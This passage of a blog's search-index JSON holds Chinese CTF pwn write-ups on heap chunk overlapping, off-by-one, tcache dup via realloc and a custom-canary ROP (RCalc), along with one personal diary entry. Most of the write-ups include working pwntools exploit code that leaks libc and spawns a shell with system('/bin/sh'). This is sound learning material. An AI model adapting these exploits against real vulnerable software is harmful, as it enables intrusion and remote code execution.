libc.search(b&quot;/bin/sh&quot;).__next__()log.success(&quot;libc_base:&#123;&#125;&quot;.format(hex(libc_base)))p.send(&quot;y&quot;)#leak stackrun(b&#x27;1&#x27;,b&#x27;a&#x27; * 56,b&#x27;2&#x27;*30) p.recvuntil(&quot;Reason:&quot;)stack_addr = u32(p.recv()[57:61])log.success(&quot;stack_addr:&#123;&#125;&quot;.format(hex(stack_addr)))p.send(&quot;y&quot;)#forge fake chunk payload = p32(0) + p32(0x41)#fake chunkpayload += b&#x27;a&#x27;*0x38payload += p32(0) + p32(0x11)run(b&#x27;a&#x27;,payload,b&#x27;c&#x27;*40 + p32(stack_addr + 8))p.send(&quot;y&quot;)gdb.attach(p)payload = b&#x27;a&#x27;*0x4c + p32(system_addr) + p32(0x12345678) + p32(bin_sh_addr)run(payload,b&#x27;a&#x27;,b&#x27;a&#x27;,)p.send(&quot;n&quot;)p.interactive()","categories":[{"name":"STACK","slug":"STACK","permalink":"https://fuurinko.github.io/categories/STACK/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"chunk_overlapping 学习","slug":"heap_learning_chunk_overlapping-学习","date":"2022-05-16T12:47:57.494Z","updated":"2022-05-17T02:39:07.910Z","comments":true,"path":"2022/05/16/heap_learning_chunk_overlapping-学习/","link":"","permalink":"https://fuurinko.github.io/2022/05/16/heap_learning_chunk_overlapping-%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"从一个例子开始：​ 先还原一个很适合的情景，pwnable的secret of my heart这道题。 ​ 我们有一个非常好用的空字节溢出，2.23的libc，可以申请的size最大为0x100，heap base已知，没有更多特殊的限制，现在我们需要leak libc，同时需要double free来任意地址写，我们有什么好的思路？ ​ 首先由于我们有一个空字节溢出，所以假如有三个连续的allocated chunk，可以先free掉第一个chunk，再申请回来，溢出一个空字节到下面的堆块的size位，覆盖previnuse位 ​ ​ 例如这个情况。 ​ 所以如果我们这时候free 1，会发生什么情况呢？不难想象，通常情况下我们free chunk1，会将这个bin放入unsorted bin中，但是由于没有uaf，所以既不能double free也不能leak。 ​ 然而实际情况是这样的： ​ 可以看到原本的-0x20chunk和0x100chunk合并成了一个0x120的chunk，并被放入了bin中，而0x100的chunk纹丝不动。 ​ 这就这涉及到free chunk的合并机制了。这里我们用的是向前合并。 向前合并原理​ 当free chunk时，首先根据当前chunk的prev inuse位判断前一个chunk（物理相邻）是否是free状态，如果是，则会触发unlink。prev size则用来计算上一个chunk的地址（以及大小），所以我们可以发现这里chunk是否合并，如何合并，完全可以被我们控制。 ​ 所以在我们之前的例子中，当我们free 这个0x100chunk，此时我们构造chunk的prev size为0x20，那么0x100chunk就认定其前一个chunk也是free chunk，因此需要进行合并。 ​ 合并的过程需要unlink将其从free list中取出，而这个过程有一定的check，首先就要求 1chunksize(P) = prev_size (next_chunk(P)) ​ 也就是下一个chunk的prev size需要与当前chunksize相等。这里的当前chunk实际是我们正在free chunk的上一个chunk，在例子中就是chunk0，其size需要等于chunk1 prev size，也就是20。 ​ 然而我们仅仅伪造这个是不够的。我们还需要满足 1(FD-&gt;bk = P || BK-&gt;fd = P) ​ 这里p就是chunk0，所以需要满足这个条件，就可以吧p的fd和bk全部设为自己，那么不管怎么指都能满足条件。 ​ 然后进行unlink，但是由于fd 和bk都是p，所以这里虽然size会变化，但是内存分布是没有变化的。 ​ 此外，因为向前合并了，所以chunk1被认为是freechunk，chunk2的prevsize位以及prev inuse位就会为0x120和0x70。 ​ 此时继续申请0x68chunk，分割unsroted bin。同时由于chunk overlap，这个0x68既是原本0x20chunk0，又是合并后的chunk1.这样就形成了double free。接着就比较好搞了。 ​ 总结一下，首先通过空字节溢出，构造unsorted bin，这个题相对来说特殊一些，然后通过堆叠以及double free构造两个重合的指针。 向后合并​ 刚刚我们研究了前向合并的解法，当然这道题作为一个比较经典的chunk overlapping题，也可以进行后向合并。 ​ ​ ​","categories":[{"name":"HEAP - ChunkOverlapping","slug":"HEAP-ChunkOverlapping","permalink":"https://fuurinko.github.io/categories/HEAP-ChunkOverlapping/"}],"tags":[{"name":"learning","slug":"learning","permalink":"https://fuurinko.github.io/tags/learning/"}]},{"title":"pawnable - secret_of_my_heart","slug":"week11_7.2_pawnable_secret_of_my_heart","date":"2022-05-15T06:05:36.744Z","updated":"2022-05-16T12:43:26.073Z","comments":true,"path":"2022/05/15/week11_7.2_pawnable_secret_of_my_heart/","link":"","permalink":"https://fuurinko.github.io/2022/05/15/week11_7.2_pawnable_secret_of_my_heart/","excerpt":"","text":"overview​ 蛮好，好久没有做到全绿的题了。 ​ 程序还是菜单，增删查三个功能，并不是特别友好。 reversemem_init​ 初始化了一个随机地址的0x1000的空间，并把它的指针存放在bss段上。 1234while ( v2 &lt;= 0x10000 ) v2 = rand() &amp; 0xFFFFF000; unk_202018 = mmap((void *)v2, 0x1000uLL, 3, 34, -1, 0LL); result = unk_202018; add1allocate(head + 48LL * i, size); 跟进allocate函数： 1234*a1 = a2; // first filed =&gt; sizeprintf(&quot;Name of heart :&quot;);read_str(a1 + 1, 32LL); // second filed =&gt; namea1[5] = malloc(a2); 这里的read_str: 12if ( *(buf + str_len - 1) == &#x27;\\n&#x27; ) *(buf + str_len - 1) = 0; ​ 判断结尾的时候-1，比如说如果我输入了20个字符，第19个是换行，那么19就会被置0，但是20还是不会变化，然后返回20这个数。 ​ 接着是： 123printf(&quot;secret of my heart :&quot;); result = (a1[5] + read_str(a1[5], a2)); // input in the head + 40 ,then put the last byte to 0 *result = 0; ​ 这样这个*result的最后就有两个空字节了。 show​ 就是打印对应的字符串。目前咩有什么好分析的， free123456*buf = 0LL;//free heapmemset((buf + 8), 0, 0x20uLL);free(*(buf + 40));//free secretresult = buf;*(buf + 40) = 0LL;//set 0 to secretreturn result ​ 非常认真地置0了很多东西。应该没有uaf了。 secret123printf(&quot;Your secret : %p\\n&quot;, head); puts(&quot;Good bye ~&quot;); exit(0); 一个bss的leak。看似赚了，实则赔钱。估计是可以打exit hook。 利用​ 还是没有什么很成型的思路，先动调一下。 1add(0x18,b&#x27;a&#x27;*0x18,b&#x27;a&#x27;*0x18) 第一个疑点（没用 ​ 1add(0x18,b&#x27;a&#x27;*0x20,b&#x27;a&#x27;*0x18) ​ ​ 这里name大于或者等于size，就会清空secret。然后将name的东西覆盖到secret的空间。比如说 ​ 稍微理一下，这里head是一个随机地址的指针，然后name储存在head上，secret ptr储存在head[5]上，是一个堆上的数据。 ​ 然后如果申请secret，大概是这样： ​ 有一个非常突兀的27，ascii是‘，我也不知道是干啥的，也不知道为什么会出现。 leak heap​ 还是继续了解程序，这里虽然程序给了我们secret的leak，但是一旦执行就会退出，所以可以利用gdb的查找来找道当前进程下这个随机的地址。比如我给我的name输入rin777，然后： ​ ​ 当然这样的坏处是每次重新开进程都需要搞一次，但是问题不大。 ​ 观察一下这个name，这里把7ffff7fff010这个地址拆开来了，但是似乎也不能溢出。然后如果free了相应的heart，name就只剩size域没有被清空。 ​ 我超，我刚刚随意show了一下，发现一个heap leak。 ​ ​ 好东西。但是不是重点。 123456add(0x20,b&#x27;qwq&#x27;+b&#x27;a&#x27; *26,b&#x27;b&#x27;*0x50)show(0)p.recvuntil(&quot;Name :&quot;)data = p.recv()[33:39]heap_base = u64(data.ljust(8,b&#x27;\\x00&#x27;))log.success(&quot;heap_base:&quot; + hex(heap_base)) ​ 哎，稳定leak heap，如果这个题没有限制size就可以用mmap leak libc了。 off by one（和一些废话）​ 继续研究。第一个疑点的稳定利用方式还是没有找到，我感觉这里是有单字节溢出，但是怎么都找不到利用方式。 ​ 我是个如假包换的傻逼，我终于知道这个问题在哪里了。我在add函数写发送name和secret的时候全部在前面加了一个str（），导致gdb显示的东西乱七八糟混淆视听了。 ​ 这样看之前那个疑点其实并不是疑点，只是一个程序的feature。 ​ 真正的off by one其实是在secret。这里确实是我傻逼了，我直接傻愣愣地连续申请三个chunk，怎么可能看得出来off by one？直接free中间的一个chunk，然后再申请回来自然就有了，还是同类题做得太太太少了。大概像这样： 123456add(0x18,b&#x27;qwq&#x27; + b&#x27;a&#x27;*29,b&#x27;b&#x27;*0x18)add(0x18,b&#x27;a&#x27;,b&#x27;b&#x27;*0x18)free(0)add(0x18,b&#x27;qaq&#x27;,b&#x27;c&#x27;*0x18)add(0x10,b&#x27;a&#x27;,b&#x27;a&#x27;)gdb.attach(p) ​ 这样就可以溢出到下一个chunk： ​ 然后就是需要利用到off by one来构造uaf。 ​ 这里如果构造off by one的chunk是unsorted bin chunk的话，uaf就可以leak libc，还能任意地址写，一举两得。 ​ 所以如何构造呢？ off by one构造double free​ 蛮久没有做off by one的题了，先大致回想一下。 12345678add(0x18,b&#x27;qwq&#x27; + b&#x27;a&#x27;*29,b&#x27;b&#x27;*0x18)add(0xf0,b&#x27;a&#x27;,b&#x27;b&#x27;*0x18)#add(0x68,b&#x27;qaq&#x27;,b&#x27;c&#x27;*0x18)add(0x10,b&#x27;a&#x27;,b&#x27;a&#x27;)free(0)payload = b&#x27;a&#x27; * 0x10 + p64(0x20)add(0x18,b&#x27;aaa&#x27;,payload) ​ 这里，这个用来被溢出的chunk的size，因为只能溢出一个空字节，所以低位会被置为00，所以这里size肯定得是三位数，所以这样一看比较方便的就是0xf8，正好对应它的free 时的size位0x100. ​ ​ 所以这里我们就伪造了一个free chunk，如果再将其free掉就能收获一个快乐的libc leak。然而事实没有那么如意，这里存在一定的检测，如果是像我测试时那样呆呆地将上一个chunk的fd和bl全部置为a的话，这里铁定会报错。 12345678910payload = p64(heap_base) * 2 + p64(0x20)add(0x18,b&#x27;aaa&#x27;,payload)#chunk3free2(1)show(0)p.recvuntil(&quot;Secret :&quot;)data = p.recv()[1:7]libc_base = u64(data.ljust(8,b&#x27;\\x00&#x27;)) - libc.symbols[&#x27;__malloc_hook&#x27;] - 0x10 - 88log.success(&quot;libc_base:&quot; + hex(libc_base))one_gadget = libc_base + one_gadget_offset[0] ​ 这样也就确实可以leak libc了。 ​ ​ 这里其实是利用到一个chunk overlapping的向前合并的原理。 ​ 20是0x100chunk的prev size位，当free 0x100chunk，就会触发unlink向前合并。 ​ 但是问题也就随之而来，我们没有办法继续利用了。 ​ 这个时候如果申请的是小于unsorted bin的chunk，那么就会从unsorted bin中分割，如果大于，就直接把整个unsorted bin 放进small bin，然后再分配。总之就是，没有任何办法再构造double free了，所以这个思路虽然能leak libc，但是不能进行任意地址写，也是白搭。 ​ 那么怎么样才能既leak又能任意地址写呢？ chunk overlapping任意地址写​ 乖乖地去看wp了。 ​ 其实还是比较套路，但是是属于我不会的程度了。其实就是在第一次向前合并的时候，再申请一个chunk2。这样在unlink的时候，chunk2就会被置为freechunk，具体原因我明天专门写一个深入理解chunk overlap。。就像这样： ​ 所以我们可以对这个chunk2进行二次free。构造一个double free。然后就可以按照套路将其fd改为对应地址，进行一个fastbin dup。 ​","categories":[{"name":"HEAP - ChunkOverlapping","slug":"HEAP-ChunkOverlapping","permalink":"https://fuurinko.github.io/categories/HEAP-ChunkOverlapping/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"攻防世界 - RCalc","slug":"week11_7.1_攻防世界_RCalc","date":"2022-05-15T01:19:30.778Z","updated":"2022-05-16T12:43:55.954Z","comments":true,"path":"2022/05/15/week11_7.1_攻防世界_RCalc/","link":"","permalink":"https://fuurinko.github.io/2022/05/15/week11_7.1_%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_RCalc/","excerpt":"","text":"overview ​ …栈溢出？ reverse​ 这个逻辑应该不是非常好逆。 buf_init​ 首先是一个初始化随机数相关内存空间的一个函数。在bss段上malloc了两个0x10大小的chunk,其中位于高地址的 chunk1 + 8，也就是0x6020F8 + 8地方保存了另外一个0x100 size chunk的指针，而位于chunk0，也就是0x6020F0 的这个chunk ，0x6020F0+8 的位置（其实就是chunk1）的位置又保存了一个size为320的chunk的指针。 1234567891011121314random_chunk1 = malloc(0x10uLL);if ( !random_chunk1 ) exit(1);random_chunk0 = malloc(0x10uLL);if ( !random_chunk0 ) exit(1);*random_chunk1 = 0LL;v0 = random_chunk1;*(v0 + 8) = malloc(0x100uLL);*random_chunk0 = 0LL;v1 = random_chunk0;result = malloc(0x320uLL);*(v1 + 8) = result;return result; run12345678910v2 = Random_Number_Generator();printf(&quot;Input your name pls: &quot;);__isoc99_scanf(&quot;%s&quot;, name);printf(&quot;Hello %s!\\nWelcome to RCTF 2017!!!\\n&quot;, name);puts(&quot;Let&#x27;s try our smart calculator&quot;);caculate();result = sub_400B92();if ( result != v2 ) default();return result; ​ 整体逻辑的实现，比较简单，重点在计算的过程。这里的name输入理应没有溢出，估计是拿来leak的。 ​ 然后首先还生成了随机数，跟进去看一看随机数的生成过程。 Random_Number_Generator()123456789101112131415161718if ( *random_chunk0 ) // if thread have not generated the random number,the value is 0,so the procedure will be skipped&#123; ptr = *(*(random_chunk0 + 8) + 8LL * *random_chunk0 - 8);// *(*chunk3 + 8 x *chunk0 - 8)&#125;else&#123; stream = fopen(&quot;/dev/urandom&quot;, &quot;r&quot;); // generate a random number and read it in ptr fread(&amp;ptr, 1uLL, 4uLL, stream); fclose(stream);&#125;srand(ptr);random = rand();v0 = random &lt;&lt; 32; // random / 2^31, taking the right 32 bitsrandom = v0 | rand(); // bit or operation, means for what? v1 = *(random_chunk0 + 8); // reserve in chunk1 v2 = (*random_chunk0)++; // Maybe likes a idx to control *(v1 + 8 * v2) = random; // I have no ideal on itreturn random; save result12345v1 = *(random_chunk1 + 8); // chunk1 &#x27;s value,point to chunk3(0x100)v2 = (*random_chunk1)++;result = a1;*(v1 + 8 * v2) = a1; // reserve result in chunk1 + (? + 8) x 8return result; ​ 这里其实我没有太理解这个保存的地方，在我看来这个*(v1 + 8 * v2) = a1; 中的v2是0x100chunk的指针，8乘以一个指针未免太可怕了。动调看一看。 ​ 大概长这样： 整理出来就是 这个0x320的chunk储存的就是生成的随机数。 ​ 所以这里 12v2 = (*random_chunk0)++; *(v1 + 8 * v2) = random; ​ 对应的v2就是这个自增的1,然后这里把随机数储存在0x6033b0。这样就比较清楚了。 ​ 同理，这个对于结果的检测的逻辑也就很清晰: 1return *(*(random_chunk0 + 8) + 8LL * (*random_chunk0)-- - 8); ​ 也就是0x603260 + （3*8-8） = 0x603288 =&gt; 0x6033b0 的地方要是随机数，以防止我们修改什么的。 ​ ​ 利用​ 开始没有目的地随机尝试（美其名曰手工fuzz），发现一个说大不大说小不小的漏洞，就是由于题目似乎是没有限制计算次数，所以计算保存的结果是可以覆盖这个chunk的，但是题目是对于这个chunk保存的随机数作了检测的，类似一个canary，所以我们并不能随意覆盖。 ​ ​ 当然由于检测在这个函数返回之前进行，所以如果我们不返回的话还是可以肆无忌惮地溢出的，但是溢出的意义何在呢？随机数大概不能修改，而这里只有一个chunk size还有一些修改的意义，但是不能free，意义也不大。 ​ 哦，这里name是可以溢出的，但是。。为什么这些题明明checksec检测没有canary但是实际还是有啊 ​ 还是有canary。而且这里比较阴间，如果想要leak canary 就必须绕过空字节，但是截断输入必须要空字节。 ​ 这个题现在是三个问题，一个是name的溢出由于canary不好控制，第二是结果保存的堆溢出由于随机数的检测无法返回，第三就是堆溢出不知道如何利用。我觉得思路应该是利用计算的漏洞，堆溢出也好，其他我没有看到的漏洞点也好，去leak一些东西，然而这样我们就没有办法重新利用name的栈溢出了。这个name的溢出只能在刚刚执行程序的时候利用，而且感觉由于这个空字节的存在，很难进行什么leak。。 ​ ps：稍微测试了一下，关于那个checksec的canary保护问题 ，canary其实是有三种模式，-fno-stack-protector就是完全关闭，-fstack-protector只保护局部变量中含有char数组的函数，-fstack-protector-all就是为所有代码添加canary。而经过测试，只有最后一种模式会使得checksec检测出canary。 ​ 看了wp，大彻大悟了。刚刚说checksec没有检测出canary，不是因为部分保护，而是因为确实就是没有加入自带的caanry，而是程序手工实现了一个canary，而name溢出的canary就来自于我们生成的随机数，所以只要我们先随意rop，然后进入计算模块，将canary覆盖为我们自己定义的数值，这时候如果再返回，其实canary就已经被改变了，那么就相当于绕过了canary。确实比较巧妙，也其实很简单，只是我一直没有意识到这个栈上的canary其实就是堆上的canary，如果意识到了的话我应该是能独立完成的。绕过caanry的地方其实之前已经很清楚了，所以下面就略略地过一下了。 栈name的canary ​ 堆的canary 可以看到高位完全一致。所以在这里全部覆盖为0的话，下一次retn的时候栈上的canary就被绕过了。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475from pwn import*context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process(&#x27;./RCalc&#x27;)#p = remote(&quot;chall.pwnable.tw&quot;,10106)elf = ELF(&#x27;./RCalc&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)rdi_ret = 0x401123printf_plt = elf.plt[&#x27;printf&#x27;] main_addr = 0x401036__libc_start_main_ = 0x601FF0def begin(name): p.recvuntil(&quot;Input your name pls: &quot;) p.sendline(name) p.recvuntil(&quot;Let&#x27;s try our smart calculator&quot;)def add(): p.recvuntil(&quot;Your choice:&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;input 2 integer: &quot;) p.sendline(&quot;0&quot;) p.sendline(&quot;0&quot;) p.recvuntil(&quot;The result is&quot;) p.recvuntil(&quot;Save the result? &quot;) p.sendline(&quot;yes&quot;)#roppayload = b&quot;\\x00&quot;*0x110payload += p64(0)payload += p64(rdi_ret)payload += p64(__libc_start_main_)payload += p64(printf_plt)payload += p64(main_addr)#payload += b&#x27;\\n&#x27;begin(payload)for i in range(35): add()p.recvuntil(&quot;Your choice:&quot;)p.sendline(&quot;5&quot;)libc_start_main_addr = u64(p.recv(6).ljust(8, b&#x27;\\x00&#x27;))libc_base = libc_start_main_addr - libc.symbols(&#x27;__libc_start_main&#x27;)system_addr = libc_base + libc.symbols(&#x27;system&#x27;)bin_sh_addr = libc_base + libc.search(&quot;/bin/sh;&quot;).__next__()log.success(&quot;libc_addr_base &quot;+hex(libc_addr_base))log.success(&quot;bin_sh_addr &quot;+hex(bin_sh_addr))payload = b&quot;\\x00&quot;*0x110payload += p64(0)payload += p64(rdi_ret)payload += p64(bin_sh_addr)payload += p64(system_addr)payload += p64(0xdeadbeef)begin(payload)for i in range(35): add()p.recvuntil(&quot;Your choice:&quot;)p.sendline(&quot;5&quot;)p.interactive() 一些思考​ 其实感觉很多题就差临门一脚，如果是在比赛的话多调半个小时可能就出了。我的定力还是太差了。","categories":[{"name":"STACK - Canary","slug":"STACK-Canary","permalink":"https://fuurinko.github.io/categories/STACK-Canary/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"pwnable - re-alloc","slug":"week11_6_pwnable_re-alloc","date":"2022-05-14T06:41:19.941Z","updated":"2022-05-14T14:58:13.061Z","comments":true,"path":"2022/05/14/week11_6_pwnable_re-alloc/","link":"","permalink":"https://fuurinko.github.io/2022/05/14/week11_6_pwnable_re-alloc/","excerpt":"","text":"overview​ 上一道题不给我调试符号，我还能找到类似的版本用，这里直接不告诉我版本了，真牛。 如果这样看不出具体版本的话，一般的方法一个是盲测，另外就是在ida中搜索gnu字符串，再或者 1strings ./libc.so | grep &quot;GNU C Library&quot; ` ​ 这道题的保护也是只有pie没有开，但是got表是可以改的。 ​ 2.29的libc目前来说比较重大的改变就是增加了tcache dup时的key检测，不过如果条件足够的话还是很好绕过。 reverse​ 还是和tcache tear类似的结构。但是整个题目都是基于realloc实现的。 alloc1234567891011121314151617181920212223242526272829303132printf(&quot;Index:&quot;); idx = read_long(); // read in a long int if ( idx &gt; 1 || heap[idx] ) // idx &#x27;s maximum is 1,which means we can allocate two chunk at most &#123; LODWORD(v0) = puts(&quot;Invalid !&quot;); &#125; else &#123; printf(&quot;Size:&quot;); size = read_long(); if ( size &lt;= 0x78 ) // we can&#x27;t allocate unsorted bin directly &#123; ptr = realloc(0LL, size); // equal to malloc(size) if ( ptr ) &#123; heap[idx] = ptr; // store the ptr in head[idx] printf(&quot;Data:&quot;); v0 = (_BYTE *)(heap[idx] + read_input(heap[idx], (unsigned int)size));// set the last character to 0 *v0 = 0; &#125; else &#123; LODWORD(v0) = puts(&quot;alloc error&quot;); &#125; &#125; else &#123; LODWORD(v0) = puts(&quot;Too large!&quot;); &#125; &#125; return (int)v0;&#125; re-alloc​ 一个比较直观的realloc。 re-free​ 类似，这里没有明显的uaf。 利用​ 逆完以后似乎没有发现明显可以利用的漏洞，并且程序是没有给我们提供show之类的函数的。由于我之前也咩有怎么做过realloc，所以不太熟悉，这里就动调一下。 ​ 挺好玩的，这里的realloc给我感觉就是一个size比原来小的edit。 ​ ​ 可以看到确实bk位新增了指向管理堆块的key，虽然我们只需要将它填成别的东西就可以double free，但是这里似乎不好填，我们只有一个realloc。 ​ 还记得去年暑假第一次做这个题的时候（当时就是看了看），看到有篇文章说realloc本身就是危险的，比如这里，如果需要扩大内存，而没有足够的空间的话，原来的指针就并不会被置0，这样就会形成一个uaf。 ​ 所以其实虽然我还是不清楚如何。利用realoc构造uaf，但是题目的思路应该就是改got进行一个leak，再改got从而getshell。 ​ 看了wp。。但是这个题似乎咩有我之前想得那么复杂，其实在realloc的环节将size置于0会造成uaf这个漏洞我之前是有思考过也确实尝试了，但是当时给我直接一个alloc error报错让我以为此路不通，我当时还为信誓旦旦地认为realloc的size为0会返回空指针，就会触发下面alloc 的检测，所以肯定不行，就没有再深入下去了。。所以为什么wp可以呢？ ​ 。。不知道，大概是我之前输入的有问题。总之这个题大概思路就是在这里。 1234alloc(0,0x18,b&#x27;a&#x27;*0x8) #chunk1realloc(0,0,&quot;&quot;) #free chunk1 tcache =&gt;chunk1realloc(0, 0x18, p64(elf.got[&quot;atoll&quot;]))#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。gdb.attach(p) ​ ​ 这道题大致的思路就是利用两次tcache dup改atoll的got表，一次将其改为printf，构造格式化字符串leak libc，另外一次就直接改atoll为system 从而getshell。 ​ 而具体tcache dup需要利用的就是realloc 0size造成的uaf，其中还需要注意排堆绕过2.29新增的key检测。 ​ 其他没有什么特别的，我这里就主要研究一下排堆。 ​ 其实到这里，我们已经将tcache的fd改为target addr了，但是这里还要绕过一个bk上的key，需要想办法把这个东西改成别的。 123alloc(0,0x18,b&#x27;a&#x27;*0x8) #chunk1realloc(0,0,&quot;&quot;) #free chunk1 tcache =&gt;chunk1realloc(0, 0x18, p64(elf.got[&quot;atoll&quot;]))#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。 ​ 在这一步bin情况如下： ​ 只构造成这样其实是不好处理的，就算不考虑key，我们想要dup到atoll got，首先要把0x7ffff7fff260申请掉，这里chunk0 已经在bin中了，想要重新申请就必须先要free掉，这样就直接double free了，不太行。所以这里只能用chunk1来将它申请掉。 ​ 这样bin中就只剩下一个atoll got了。但是heap处，由于我们刚刚申请的chunk1的内存地址是0x7ffff7fff260，正好覆盖了chunk0。 ​ 所以内存中就变成了这样： ​ 现在我们想要再次申请到这个atoll got，也就是需要申请一个0x18大小的chunk，然而我们刚刚用掉了chunk1，chunk0也还在bin中，难以发挥作用，这样看来似乎陷入了死循环，但是破局之处正在于tcache的double free，只要我们想办法把chunk0的bk改掉，就可以double free了。 关于这个地方，当我们把0x7ffff7fff260用chunk1申请掉，然后准备申请atoll got的时候，其实chunk1这里已经将bk覆盖为一个合法的值了，也就是说这里我们就已经能够成功将chunk0free了。 ​ 但是如果就这样free的话，会变成这种情况： ​ 也就是fd就会变成atoll got，tcache bin又变成 0x7ffff7fff260 —▸ 0x404048了。原因很好理解，就是我们free了0x7ffff7fff260上的chunk0，所以被放入了tcache，那么如何让这个东西不被插入tcache呢？这个时候我们只要稍微调整一下chunk0的size，让它不正好插入到0x20的bin中就好了。 ​ ​ 先测试一下： 12345678alloc(0,0x18,b&#x27;a&#x27;*0x8) #chunk1realloc(0,0,&quot;&quot;) #free chunk1 tcache =&gt;chunk1realloc(0, 0x18, p64(elf.got[&quot;atoll&quot;]))#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。alloc(1,0x18,b&#x27;b&#x27;*0x8) #chunk2realloc(0,0x28,b&#x27;a&#x27;*0x8)free(0)alloc(0,0x18,p64(elf.plt[&quot;printf&quot;]))gdb.attach(p) 可以看到确实这一步atoll got被改为了printf got。 ​ ​ 但是由于需要改两次，如果在这里就把got改了，后面就不好执行了，所以可以先利用相同的办法创建两个tcache dup。还需要注意的是我们不能破釜沉舟，我们还需要将chunk1也free掉，以保证第二次能够正常利用，也就是： 123456789alloc(0,0x18,b&#x27;a&#x27;*0x8) #chunk1realloc(0,0,&quot;&quot;) #free chunk1 tcache =&gt;chunk1realloc(0, 0x18, p64(elf.got[&quot;atoll&quot;]))#对于tcache bin中的ptr进行realloc，并不会将ptr从tcache中取出，也就是一个edit功能。alloc(1,0x18,b&#x27;b&#x27;*0x8) #chunk2realloc(0,0x28,b&#x27;d&#x27;)free(0)realloc(1, 0x28, b&quot;d&quot;*0x10)free(1) ​ 这样换一下size再重复一次，就构造出了两个tcahce的dup，然后我们先把第一个atoll改为printf。 ​ 然后直接利用格式化字符串leak libc。 ​ leak之后直接再利用第二个atoll将got改为system。这里的利用就比较套路化，没有什么值得研究的了，就是需要注意在最后一次申请的时候是利用printf的返回值作为长度。 ​ pwnable的环境好恶心啊。 ​ ​","categories":[{"name":"Tcache","slug":"Tcache","permalink":"https://fuurinko.github.io/categories/Tcache/"}],"tags":[{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"}]},{"title":"夏","slug":"幻想曲-03-夏","date":"2022-05-13T15:00:21.492Z","updated":"2022-05-16T12:23:26.770Z","comments":true,"path":"2022/05/13/幻想曲-03-夏/","link":"","permalink":"https://fuurinko.github.io/2022/05/13/%E5%B9%BB%E6%83%B3%E6%9B%B2-03-%E5%A4%8F/","excerpt":"","text":"​ ​ 挺久没有写日记或者说杂文了，但是现在是十点五十五分，介于我还想洗一个澡，而我也不想带电脑回寝室，所以我只有五分钟来尽我所能多说些。 ​ 最近刷题的速度确实放缓了许多，我也承认最近的我变得有一些懒散了，这是必须要改的问题，但是我也知道我没有办法迅速让自己爱上学英语，而一个人做一些他不热爱的事情总是会变得消极，但是总会熬出头的。学英语的进步也确实是看得到的，也比较迅速，一个月前啥也不懂，一个月后已经能多积累几千个单词了，还是一个比较难得的激励，但是这对我来说远不及我自己独立做出一道题的快乐大，也许我背2000个单词的快乐也就当得我自己做一道简单堆题的快乐吧。 ​ 确实没有办法，人生就是妥协的连续。 ​ 现在是2022年五月16日下午19:57分。今天下午我第三次逃了信号与系统的实验课，躺在床上看了一个小时红书，然后写了一个小时的日记。当然是在本子上写，有时候用钢笔写字确实比打字更有感觉一些，写出来的东西也更具文学性，虽然大多数时候打字确实更加愉悦 ，但是脑子通常跟不上手的速度，因此也没有过多的时间来组织一些复杂的句式或者挖出一些高深的词藻，不过只要表达到位，反正也没有人看，结果是一样的。 ​ 胖爷爷说我成长了很多，虽然作为见识差不多的同辈说出这样的话有一些些措辞不恰当，但是我丝毫不关心。其实在我人生的很多重要时期我都会陷入类似的状态，然而我确实能够认识到“这次与以前都不同”。 ​ 就如我的日记，以及之前的杂文提及过的，以前我的驱动力实则是来源于苦难中剥离的自我感动，虽然在一定程度上也能够实现所谓的目标，但是结果通常不是完全符合预期的，并且这种高强度的内耗很大一部分导致了我现在自卑心理。但是不得不承认，这是每个人的必经之路，而我应该感到庆幸，我已经从这样的恶性循环中半脱离出来了。 ​ 我比以前的任何时候都更加频繁地写作，用写作来形容这样倒垃圾式的文字输出或许不太准确，但是对于我来说这是我个人的艺术，是不容置喙的。通过写作来对我人生的问题进行探讨发掘甚至提出解决方式，是我从高中以来的习惯，只不过我比较懒，即使是五颜六色的彩墨也无法撼动我懒得动笔的恶习，而且那时候沉迷花里胡哨的手帐（其实现在的博客和手帐本质的作用是同源的（仅仅对我个人来说），因为我写这些东西很大程度是我个人的记录，而不是分享出来给谁看的，量他也看不懂我这糟糕的逻辑），更加注重文字的载体的美观性，而忽略了文字本身。 ​ 即使是这样，即使我认为当代中国跟需要的不仅是高精尖技术型人才，还需要有见识有思想的文学家，只不过目前社会人才需求依然是实用主义的，码农就是比狗屁学汉语言文学的赚钱，我也没有在贬低自己，毕竟我既不是码农也不是文学少女，我只是一个可怜的卖手机卡的。而一个卖手机卡的，居然想要成为靠代码为生的文学思想家，同时还要精通英语，善于处事，顺便还能欣赏高雅艺术，哦，似乎还得打扮得光鲜亮丽，浓妆不至于，至少需要打理头发，做个底妆吧。很显然这不是一个五线小城市的平普通家庭能够轻易抚养出来的人才，所以又回到了最初的问题。 ​ 有时候人不能轻易地解决环境问题，但是自己的问题，只要足够认真，还是有解决的方法的。噪音使人抓狂，我不是聋子，也不敢一棍子打死发出噪音的人。只能赚钱买个好点的降噪耳机了。 ​ ​ ​ ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]},{"title":"pwnable - teacher_tear","slug":"week11_5_pwnable_teacher_tear","date":"2022-05-13T12:24:56.686Z","updated":"2022-05-14T06:41:21.904Z","comments":true,"path":"2022/05/13/week11_5_pwnable_teacher_tear/","link":"","permalink":"https://fuurinko.github.io/2022/05/13/week11_5_pwnable_teacher_tear/","excerpt":"","text":"overview​ 除了pie其他都开，这样就不能修改got表了。 ​ 